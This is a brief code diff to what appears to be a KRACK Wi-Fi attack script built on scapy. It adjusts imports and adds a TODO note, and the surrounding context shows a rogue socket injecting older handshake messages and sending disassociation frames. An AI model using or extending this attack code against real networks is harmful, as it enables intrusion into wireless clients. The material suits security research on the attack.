@@ -6,9 +6,10 @@
 # This code may be distributed under the terms of the BSD license.
 # See README for more details.
 import os, sys
-sys.path.append(os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'scapy'))
 from scapy.all import *  # noqa: E402
-from scapy.arch.linux import L2Socket
+from scapy.arch.linux import L2Socket, attach_filter
+from scapy.layers.dot11 import *
+from scapy.layers.eap import *
 
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
@@ -1010,7 +1011,8 @@ class KRAckAttack():
                 self.sock_rogue.send(p)
                 self.time_forward_group1 = None
                 log(STATUS, "Injected older group message 1: %s" % dot11_to_str(p), color="green")
-
+            
+            # TODO: Should I disassociate and reset the 4-way handshake more infrequently?
             while len(self.disas_queue) > 0 and self.disas_queue[0][0] <= time.time():
                 self.send_disas(self.disas_queue.pop()[1])
 
